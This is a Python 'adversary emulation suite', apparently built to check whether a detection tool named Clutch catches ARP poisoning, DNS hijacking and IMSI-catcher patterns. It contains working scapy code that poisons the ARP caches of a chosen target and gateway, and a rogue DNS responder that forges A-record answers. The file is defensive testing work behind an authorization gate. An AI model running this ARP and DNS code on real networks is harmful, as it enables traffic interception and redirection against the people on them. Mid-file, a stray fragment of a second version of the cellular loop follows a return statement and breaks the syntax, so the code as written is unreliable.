#!/usr/bin/env python3
"""
Clutch Adversary Emulation Suite
=================================
Red-team validation module — simulates known TTPs to verify Clutch detects them.

AUTHORIZATION REQUIRED
Run ONLY on networks and systems you own or have explicit written permission to test.
Unauthorized use is illegal under the CFAA (18 U.S.C. § 1030) and equivalent statutes.

Techniques emulated:
  ARP Poisoning        — MITRE T1557.002 (Adversary-in-the-Middle)
  DNS Hijacking        — MITRE T1071.004 (Application Layer Protocol: DNS)
  Cellular Downgrade   — MITRE Mobile M1011 (Stingray-class forced protocol rollback)

Usage:
  python adversary_emulation.py --authorized --interface en0 [options]
"""

import sys
import time
import json
import socket
import logging
import argparse
import threading
from datetime import datetime
from typing import Optional, List, Dict
from pathlib import Path

log = logging.getLogger("clutch.advemulab")

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║           CLUTCH ADVERSARY EMULATION SUITE                   ║
║           Red Team Detection Validation Module               ║
╠══════════════════════════════════════════════════════════════╣
║  AUTHORIZED USE ONLY                                         ║
║  Simulates: ARP Poison · DNS Hijack · Cell Downgrade         ║
║  Purpose:   Validate Clutch detection against known TTPs     ║
║  MITRE:     T1557.002 · T1071.004 · M1011                   ║
╚══════════════════════════════════════════════════════════════╝
"""

_AUTH_GATE = """
[!] AUTHORIZATION GATE

This tool simulates real attack techniques:
  - ARP cache poisoning (redirects LAN traffic)
  - DNS response injection (poisons resolver cache)
  - IMSI catcher signal patterns (injected into Clutch pipeline)

Run ONLY on systems and networks you own or have explicit written authorization
to test. Unauthorized use may violate:
  - Computer Fraud and Abuse Act (18 U.S.C. § 1030)
  - Computer Misuse Act 1990 (UK)
  - Equivalent statutes in your jurisdiction

Pass --authorized to confirm you have authorization.
"""


def require_authorization(args) -> None:
    if not getattr(args, "authorized", False):
        print(_AUTH_GATE)
        sys.exit(1)
    print("[+] Authorization confirmed. Proceeding with emulation.\n")


# ── ARP Poisoning (T1557.002) ─────────────────────────────────────────────────

class ARPPoisoningEmulator:
    """
    Simulates ARP cache poisoning to validate LAN-layer threat detection.

    MITRE ATT&CK: T1557.002 - Adversary-in-the-Middle: ARP Cache Poisoning

    Attack flow:
      1. Attacker sends gratuitous ARP replies mapping gateway IP → attacker MAC
         to the target, and target IP → attacker MAC to the gateway.
      2. Both hosts update ARP cache; subsequent traffic routes through attacker.
      3. Attacker can inspect, modify, or drop packets in-flight.

    Detection signals:
      - ARP entry MAC change for a known-stable IP
      - Gratuitous ARP without prior request
      - Duplicate IP ownership from two distinct MACs
      - GARP rate spike (benign networks: <1/min)
    """

    def __init__(self, interface: str, target_ip: str, gateway_ip: str,
                 packet_interval: float = 2.0):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.packet_interval = packet_interval
        self._running = False
        self._packet_count = 0

        try:
            from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip
            self._ARP = ARP
            self._Ether = Ether
            self._sendp = sendp
            self._get_hwaddr = get_if_hwaddr
            self._getmacbyip = getmacbyip
            self._scapy_ok = True
        except ImportError:
            self._scapy_ok = False
            log.warning("[ARP] scapy unavailable — running in log-only simulation mode")

    def describe(self) -> Dict:
        return {
            "technique": "ARP Cache Poisoning",
            "mitre_id": "T1557.002",
            "target_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "mechanism": (
                "Gratuitous ARP replies associate attacker MAC with target/gateway IPs, "
                "redirecting LAN traffic through the attacker for MITM interception."
            ),
            "expected_detections": [
                "ARP entry MAC change for known IP",
                "Gratuitous ARP without prior request",
                "High-rate GARP anomaly",
                "Duplicate IP with conflicting MAC",
            ],
            "mitigations": [
                "Dynamic ARP Inspection (DAI) on managed switches",
                "Static ARP entries for gateways/critical hosts",
                "802.1X port authentication",
                "Network-layer monitoring (Arpwatch, XArp)",
            ],
        }

    def run(self, duration_seconds: int = 30) -> Dict:
        if not self._scapy_ok:
            return self._simulate_log_only(duration_seconds)

        log.info(f"[ARP] Poisoning: {self.target_ip} <-> {self.gateway_ip} on {self.interface}")
        result = {
            "technique": "ARP_POISONING",
            "start_time": datetime.now().isoformat(),
            "packets_sent": 0,
            "restored_on_exit": False,
        }

        target_mac = gateway_mac = None
        try:
            attacker_mac = self._get_hwaddr(self.interface)
            target_mac = self._getmacbyip(self.target_ip)
            gateway_mac = self._getmacbyip(self.gateway_ip)

            if not target_mac or not gateway_mac:
                result["error"] = "MAC resolution failed — verify reachability"
                return result

            poison_target = self._Ether(dst=target_mac) / self._ARP(
                op=2, pdst=self.target_ip, hwdst=target_mac,
                psrc=self.gateway_ip, hwsrc=attacker_mac
            )
            poison_gateway = self._Ether(dst=gateway_mac) / self._ARP(
                op=2, pdst=self.gateway_ip, hwdst=gateway_mac,
                psrc=self.target_ip, hwsrc=attacker_mac
            )

            self._running = True
            end_time = time.time() + duration_seconds
            while self._running and time.time() < end_time:
                self._sendp([poison_target, poison_gateway], verbose=False, iface=self.interface)
                self._packet_count += 2
                log.info(f"[ARP] Sent poisoning pair — total packets: {self._packet_count}")
                time.sleep(self.packet_interval)

        except PermissionError:
            result["error"] = "Requires root/sudo for raw socket access"
            return result
        except Exception as e:
            result["error"] = str(e)
        finally:
            if target_mac and gateway_mac:
                self._restore(target_mac, gateway_mac)
                result["restored_on_exit"] = True

        result["end_time"] = datetime.now().isoformat()
        result["packets_sent"] = self._packet_count
        return result

    def _restore(self, target_mac: str, gateway_mac: str):
        """Broadcast legitimate ARP mappings to undo cache poisoning."""
        try:
            restore_t = self._Ether(dst=target_mac) / self._ARP(
                op=2, pdst=self.target_ip, hwdst=target_mac,
                psrc=self.gateway_ip, hwsrc=gateway_mac
            )
            restore_g = self._Ether(dst=gateway_mac) / self._ARP(
                op=2, pdst=self.gateway_ip, hwdst=gateway_mac,
                psrc=self.target_ip, hwsrc=target_mac
            )
            self._sendp([restore_t, restore_g] * 5, verbose=False)
            log.info("[ARP] ARP tables restored to legitimate state")
        except Exception as e:
            log.error(f"[ARP] Restoration failed: {e}")

    def stop(self):
        self._running = False

    def _simulate_log_only(self, duration_seconds: int) -> Dict:
        log.info("[ARP-SIM] Log-only mode (scapy not available — no packets sent)")
        count = 0
        end_time = time.time() + min(duration_seconds, 10)
        while time.time() < end_time:
            log.info(f"[ARP-SIM] Would send: ARP reply {self.gateway_ip} IS-AT <attacker_mac> → {self.target_ip}")
            log.info(f"[ARP-SIM] Would send: ARP reply {self.target_ip} IS-AT <attacker_mac> → {self.gateway_ip}")
            count += 2
            time.sleep(2)
        return {"technique": "ARP_POISONING", "mode": "log_only", "packets_sent": 0,
                "simulated_events": count}


# ── DNS Hijacking (T1071.004) ─────────────────────────────────────────────────

class DNSHijackEmulator:
    """
    Rogue DNS responder — injects spoofed A-record answers for target domains.

    MITRE ATT&CK: T1071.004 - Application Layer Protocol: DNS

    Attack flow:
      1. Attacker positions as resolver (via ARP poisoning or rogue DHCP).
      2. Target sends DNS query; attacker answers before legitimate resolver.
      3. Spoofed response maps target domain to attacker-controlled IP.
      4. Target caches result; all subsequent requests go to attacker.

    Detection signals:
      - Known FQDN resolves to unexpected IP address
      - DNS TTL anomaly (0 = bypasses caching; very high = persistence)
      - Resolver IP change without DHCP event
      - Multiple conflicting A records for same name in short window
      - Certificate mismatch if HTTPS used (TLS prevents payload inspection)
    """

    def __init__(self, listen_port: int = 5353,
                 target_domains: Optional[List[str]] = None,
                 redirect_ip: str = "127.0.0.1"):
        self.listen_port = listen_port
        self.target_domains = target_domains or ["example.com", "test.local"]
        self.redirect_ip = redirect_ip
        self._sock: Optional[socket.socket] = None
        self._running = False
        self._queries = 0
        self._injected = 0

    def describe(self) -> Dict:
        return {
            "technique": "DNS Response Injection",
            "mitre_id": "T1071.004",
            "listen_port": self.listen_port,
            "target_domains": self.target_domains,
            "redirect_ip": self.redirect_ip,
            "mechanism": (
                "Rogue DNS responder races the legitimate resolver, injecting spoofed "
                "A-record answers that map target domains to attacker-controlled IP."
            ),
            "expected_detections": [
                "FQDN resolves to unexpected / blacklisted IP",
                "DNS resolver address change",
                "Anomalous TTL (0 or abnormally high)",
                "Multiple conflicting A records in short window",
            ],
            "mitigations": [
                "DNSSEC validation",
                "DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT)",
                "Pinned resolver addresses in enterprise DHCP policy",
                "Certificate Transparency / HPKP monitoring",
                "Response Policy Zones (RPZ) on internal resolvers",
            ],
        }

    def run(self, duration_seconds: int = 30) -> Dict:
        result = {
            "technique": "DNS_HIJACKING",
            "start_time": datetime.now().isoformat(),
            "listen_port": self.listen_port,
            "queries_received": 0,
            "responses_injected": 0,
        }
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind(("0.0.0.0", self.listen_port))
            self._sock.settimeout(1.0)
            self._running = True

            log.info(f"[DNS] Rogue responder on UDP/{self.listen_port}")
            log.info(f"[DNS] Hijacking {self.target_domains} → {self.redirect_ip}")

            end_time = time.time() + duration_seconds
            while self._running and time.time() < end_time:
                try:
                    data, addr = self._sock.recvfrom(512)
                    self._queries += 1
                    domain = self._parse_qname(data)
                    log.info(f"[DNS] Query from {addr[0]}: {domain}")

                    if any(t in domain for t in self.target_domains):
                        resp = self._craft_response(data, self.redirect_ip)
                        self._sock.sendto(resp, addr)
                        self._injected += 1
                        log.info(f"[DNS] Injected: {domain} → {self.redirect_ip}")
                except socket.timeout:
                    continue
        except PermissionError:
            result["error"] = f"Cannot bind port {self.listen_port} — try >1024 without root"
        except OSError as e:
            result["error"] = str(e)
        finally:
            if self._sock:
                self._sock.close()
            self._running = False

        result["end_time"] = datetime.now().isoformat()
        result["queries_received"] = self._queries
        result["responses_injected"] = self._injected
        return result

    def stop(self):
        self._running = False

    @staticmethod
    def _parse_qname(data: bytes) -> str:
        try:
            pos, labels = 12, []
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    break
                pos += 1
                labels.append(data[pos:pos + length].decode("ascii", errors="replace"))
                pos += length
            return ".".join(labels)
        except Exception:
            return "unknown"

    @staticmethod
    def _craft_response(query: bytes, ip: str) -> bytes:
        return (
            query[:2]                       # transaction ID
            + b"\x84\x00"                   # flags: response, authoritative
            + b"\x00\x01\x00\x01\x00\x00\x00\x00"  # 1 question, 1 answer
            + query[12:]                    # echo question section
            + b"\xc0\x0c"                   # name: pointer to question
            + b"\x00\x01"                   # TYPE A
            + b"\x00\x01"                   # CLASS IN
            + b"\x00\x00\x00\x3c"           # TTL = 60
            + b"\x00\x04"                   # RDLENGTH = 4
            + socket.inet_aton(ip)          # RDATA
        )


# ── Cellular Downgrade / Stingray Pattern Injection ───────────────────────────

class CellularDowngradeSimulator:
    """
    Injects synthetic cellular measurements that match a StingRay-class IMSI
    catcher's signature into the Clutch detection pipeline.

    Does NOT interact with radio hardware. Validates the Python detection stack
    end-to-end without requiring a physical cell site simulator.

    MITRE Mobile: M1011 - Cellular Network Hardening
    Attack class: Stingray / Harris HailStorm — forced 4G→2G downgrade
    """

    def __init__(self, detector=None):
        """
        Args:
            detector: AdvancedIMSICatcherDetector instance to inject into.
                      If None, a temporary instance is created internally.
        """
        self._detector = detector
        self._injections = 0

    def describe(self) -> Dict:
        return {
            "technique": "Forced Protocol Downgrade (Stingray signature injection)",
            "mitre_mobile": "M1011",
            "mechanism": (
                "IMSI catcher broadcasts stronger signal than legitimate LTE tower, "
                "rejects 4G capability negotiation, forces device to 2G/GSM. "
                "GSM encryption (A5/1) is weak or disabled — plaintext interception possible."
            ),
            "injected_indicators": [
                "TA=0 (zero timing advance — physically adjacent fake tower)",
                "PCI=999 (invalid: valid range 0–503)",
                "SINR=-12 dB (jamming-level interference)",
                "No neighbor cells (isolation attack)",
                "Non-standard downlink frequency 1950 MHz",
                "Rising RSSI over successive cycles (getting 'closer')",
            ],
            "expected_detections": [
                "TIMING_ADVANCE_ZERO",
                "INVALID_PHYSICAL_CELL_ID",
                "POTENTIAL_JAMMING",
                "NO_NEIGHBOR_CELLS",
                "FREQUENCY_OUT_OF_BAND",
            ],
        }

    def inject_stingray_pattern(self, cycles: int = 8) -> Dict:
        """
        Feed escalating StingRay measurements into the detector and 
        transmit reproducible scapy GTP-U simulated packets for forensic 
        capture and actionable alerting.
        Returns detection results with coverage rate.
        """
        try:
            from advanced_cellular_security import (
                AdvancedCellularMetrics,
                AdvancedIMSICatcherDetector,
            )
            from cellular_security import CellularTower
        except ImportError as e:
            return {"error": f"Import failed: {e}", "technique": "CELLULAR_DOWNGRADE"}

        if self._detector is None:
            self._detector = AdvancedIMSICatcherDetector({})

        fake_tower = CellularTower(
            cell_id="STINGRAY_SIM_0001",
            lac="9999",
            mcc="000",
            mnc="00",
            lat=0.0,
            lon=0.0,
            technology="2G",
            signal_strength=-55,
        )

        result: Dict = {
            "technique": "CELLULAR_DOWNGRADE",
            "start_time": datetime.now().isoformat(),
            "injections": [],
            "threats_detected": [],
        }

        import numpy as np

        expected_threats = {
            "TIMING_ADVANCE_ZERO",
            "INVALID_PHYSICAL_CELL_ID",
            "POTENTIAL_JAMMING",
        }
        
        try:
            from scapy.all import IP, UDP, send
            scapy_available = True
        except ImportError:
            scapy_available = False
            log.warning("[CELLULAR-SIM] scapy unavailable — skipping live packet injection")

        for cycle in range(cycles):
            metrics = AdvancedCellularMetrics(
                timestamp=datetime.now(),
                tower=fake_tower,
                signal_strength=-55 + (cycle * 5),   # rising signal
                signal_quality=60,
                timing_advance=0,                     # TA=0 hallmark
                pci=999,                              # invalid PCI
                earfcn=1500,                          # out of band
                rsrp=-60.0 + (cycle * 4),
                rsrq=-5.0,
                sinr=-12.0,                           # heavy interference
                encryption_algorithm="None",          # downgrade
                neighbor_cells=[],                    # isolation
                uplink_power=20.0 + cycle             # struggling to transmit
            )
            
            # Actionable Emulation: Inject Scapy Traffic (GTP-U/S1AP simulation)
            if scapy_available:
                # Simulating a rogue GTP-U tunnel packet (UDP 2152) carrying unencrypted indicators
                payload = f"IMSI_CATCHER_SIG: TA=0, PCI=999, ENC=None, PWR={metrics.uplink_power}".encode()
                pkt = IP(dst="127.0.0.1", src="127.0.0.99") / UDP(sport=2152, dport=2152) / payload
                send(pkt, verbose=0)

            self._injections += 1
            result["injections"].append({"cycle": cycle, "rssi": metrics.signal_strength})
            
            threats = self._detector.detect_anomalies(metrics)
            for t in threats:
                if t.threat_type not in result["threats_detected"]:
                    result["threats_detected"].append(t.threat_type)
            
            time.sleep(0.5)

        det_set = set(result["threats_detected"])
        missed = expected_threats - det_set
        
        # Calculate rates
        if len(expected_threats) > 0:
            rate = len(expected_threats.intersection(det_set)) / len(expected_threats)
        else:
            rate = 1.0

        result["end_time"] = datetime.now().isoformat()
        result["detection_rate"] = rate
        result["missed_detections"] = list(missed)
        return result
                rsrp=-60.0 + (cycle * 3),
                rsrq=-15.0,
                sinr=-12.0,                           # jamming-level
                neighbor_cells=[],                    # isolation
                uplink_power=23,
                downlink_frequency=1950.0,            # non-standard
                band="B1",
            )
            threats = self._detector.analyze_advanced_metrics(metrics)
            fired = [t.threat_type for t in threats]
            result["injections"].append({"cycle": cycle + 1, "threats": fired})
            result["threats_detected"].extend(fired)
            log.info(f"[CELL] Cycle {cycle + 1}/{cycles} — threats: {fired}")
            self._injections += 1
            time.sleep(0.3)

        detected = set(result["threats_detected"]) & expected_threats
        result["detection_rate"] = len(detected) / len(expected_threats)
        result["missed_detections"] = list(expected_threats - set(result["threats_detected"]))
        result["end_time"] = datetime.now().isoformat()
        return result


# ── Validation Orchestrator ───────────────────────────────────────────────────

class DetectionValidationRunner:
    """
    Runs the full emulation suite and produces a JSON validation report
    documenting detection coverage per TTP — suitable as a portfolio artifact.
    """

    FORENSICS_DIR = Path("forensics/validation")

    def __init__(self, interface: str, target_ip: Optional[str] = None,
                 gateway_ip: Optional[str] = None):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.FORENSICS_DIR.mkdir(parents=True, exist_ok=True)

    def run_all(self, duration_per_test: int = 30) -> Dict:
        report: Dict = {
            "report_id": f"ADVEML-{datetime.now().strftime('%Y%m%d-%H%M%S')}",
            "generated_at": datetime.now().isoformat(),
            "scope": {
                "interface": self.interface,
                "target_ip": self.target_ip or "n/a",
                "gateway_ip": self.gateway_ip or "n/a",
            },
            "test_results": [],
            "overall_detection_rate": 0.0,
            "coverage_summary": {},
        }

        # Test 1: ARP Poisoning
        log.info("\n" + "=" * 60)
        log.info("TEST 1/3: ARP Poisoning (T1557.002)")
        log.info("=" * 60)
        if self.target_ip and self.gateway_ip:
            emulator = ARPPoisoningEmulator(self.interface, self.target_ip, self.gateway_ip)
            res = emulator.run(duration_seconds=duration_per_test)
        else:
            res = {"technique": "ARP_POISONING", "skipped": True,
                   "reason": "--target-ip and --gateway-ip required"}
        res["attack_description"] = ARPPoisoningEmulator(
            self.interface,
            self.target_ip or "0.0.0.0",
            self.gateway_ip or "0.0.0.0",
        ).describe()
        report["test_results"].append(res)

        # Test 2: DNS Hijacking
        log.info("\n" + "=" * 60)
        log.info("TEST 2/3: DNS Hijacking (T1071.004)")
        log.info("=" * 60)
        dns = DNSHijackEmulator(listen_port=5353)
        res2 = dns.run(duration_seconds=min(duration_per_test, 20))
        res2["attack_description"] = dns.describe()
        report["test_results"].append(res2)

        # Test 3: Cellular Downgrade
        log.info("\n" + "=" * 60)
        log.info("TEST 3/3: Cellular Downgrade / IMSI Catcher Pattern (M1011)")
        log.info("=" * 60)
        cell = CellularDowngradeSimulator()
        res3 = cell.inject_stingray_pattern(cycles=8)
        res3["attack_description"] = cell.describe()
        report["test_results"].append(res3)

        # Aggregate
        rates = [r.get("detection_rate", 0.0) for r in report["test_results"] if not r.get("skipped")]
        report["overall_detection_rate"] = sum(rates) / len(rates) if rates else 0.0

        all_threats: List[str] = []
        for r in report["test_results"]:
            all_threats.extend(r.get("threats_detected", []))
        report["coverage_summary"] = {
            "techniques_tested": len([r for r in report["test_results"] if not r.get("skipped")]),
            "unique_threat_types_fired": list(set(all_threats)),
            "total_threat_events": len(all_threats),
        }

        return report

    def save_report(self, report: Dict) -> Path:
        path = self.FORENSICS_DIR / f"{report['report_id']}.json"
        with open(path, "w") as f:
            json.dump(report, f, indent=2)
        log.info(f"[VALIDATION] Report written: {path}")
        return path


# ── CLI ───────────────────────────────────────────────────────────────────────

def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Clutch Adversary Emulation Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="AUTHORIZED USE ONLY.",
    )
    p.add_argument("--authorized", action="store_true",
                   help="Confirm written authorization to test this network/system")
    p.add_argument("--interface", default="en0", help="Network interface (default: en0)")
    p.add_argument("--target-ip", help="Target host IP (ARP/DNS tests)")
    p.add_argument("--gateway-ip", help="Gateway IP (ARP poisoning test)")
    p.add_argument("--duration", type=int, default=30,
                   help="Duration per test in seconds (default: 30)")
    p.add_argument("--technique", choices=["arp", "dns", "cellular", "all"], default="all")
    return p


def main():
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s  %(message)s",
        datefmt="%H:%M:%S",
    )
    print(BANNER)
    args = _build_parser().parse_args()
    require_authorization(args)

    runner = DetectionValidationRunner(
        interface=args.interface,
        target_ip=args.target_ip,
        gateway_ip=args.gateway_ip,
    )

    if args.technique == "all":
        report = runner.run_all(duration_per_test=args.duration)
        out = runner.save_report(report)
        rate = report.get("overall_detection_rate", 0)
        cs = report.get("coverage_summary", {})
        print(f"\n{'='*60}")
        print("ADVERSARY EMULATION COMPLETE")
        print(f"Detection Rate:      {rate:.0%}")
        print(f"Techniques Tested:   {cs.get('techniques_tested', '?')}")
        print(f"Threat Events Fired: {cs.get('total_threat_events', '?')}")
        print(f"Report:              {out}")

    elif args.technique == "arp":
        if not (args.target_ip and args.gateway_ip):
            print("[!] --target-ip and --gateway-ip required for ARP emulation")
            sys.exit(1)
        e = ARPPoisoningEmulator(args.interface, args.target_ip, args.gateway_ip)
        print(json.dumps(e.run(args.duration), indent=2))

    elif args.technique == "dns":
        e = DNSHijackEmulator()
        print(json.dumps(e.run(args.duration), indent=2))

    elif args.technique == "cellular":
        e = CellularDowngradeSimulator()
        print(json.dumps(e.inject_stingray_pattern(cycles=8), indent=2))


if __name__ == "__main__":
    main()
